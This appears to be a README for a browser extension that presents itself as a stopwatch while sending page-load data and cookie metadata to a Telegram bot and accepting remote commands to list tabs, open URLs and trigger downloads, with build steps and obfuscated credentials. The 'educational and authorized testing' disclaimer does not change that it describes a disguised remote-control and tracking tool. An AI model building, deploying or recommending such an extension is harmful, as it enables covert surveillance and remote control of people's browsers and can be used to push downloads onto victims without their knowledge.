# Stop Watch Extension - Telegram Control

> **For Educational & Authorized Testing Only** | Do Not Use Maliciously


A browser extension combining a stopwatch with Telegram remote control. Tracks page loads and sends cookie metadata (**never values**) to a Telegram bot. Remotely list tabs, open URLs, and trigger downloads via bot commands.

---

## Quick Start

### 1. Build & Configure
```bash
git clone https://github.com/yourusername/stop-watch-ext.git
cd stop-watch-ext
python3 extension_builder.py 
```

### 2. Install
- **Chrome/Brave/Edge**: Load unpacked from `stop-watch-chrome.zip` extract or build dir
- **Firefox**: Load Temporary Add-on from `stop-watch-firefox.zip`/manifest.json
- **Safari**: Open `StopWatch.safariextension` in Xcode

---

## Commands

| Command | Action |
|---|---|
| `tabs` / `list` | Show open tabs |
| `status` / `info` / `about` | Extension status |
| `dl <url>` | Download URL |
| `https://...` | Open link in new tab |

---

## Build Modes

```bash
# Auto-fetch chat ID
python3 extension_builder.py --update-creds chrome,firefox

# With custom chat ID
python3 extension_builder.py --update-creds --chat-id=123456 chrome,firefox,safari

# Custom zip names
python3 extension_builder.py chrome,firefox chrome=ext.zip firefox=ext-ff.zip

# Build without updating creds
python3 extension_builder.py chrome
```

---

## Security Notes

- Credentials encoded with `hide()` (base64 + XOR 0x5a) — obfuscation only
- Cookie **values are never** read or transmitted
- Rotate bot token if exposed
- Use only with explicit authorization
